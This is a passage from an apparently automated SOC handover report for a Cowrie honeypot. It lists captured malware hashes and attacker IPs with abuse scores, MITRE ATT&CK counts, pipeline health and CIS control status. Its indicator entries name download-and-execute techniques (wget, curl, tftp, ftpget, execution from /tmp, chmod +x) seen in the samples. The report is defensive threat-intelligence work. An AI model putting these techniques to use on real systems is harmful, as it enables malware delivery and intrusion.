| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 8 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `66.132.195[.]37` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `200.255.205[.]162` | BR | PARCO PAPELARIA LTDA | **100** ⚠️ | 23 |
| `45.198.224[.]26` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `8.211.183[.]26` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 10 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 50 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 3 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 136 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 46 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (18.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 15 recon entry/entries in table (6 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-25T20:34:34Z_
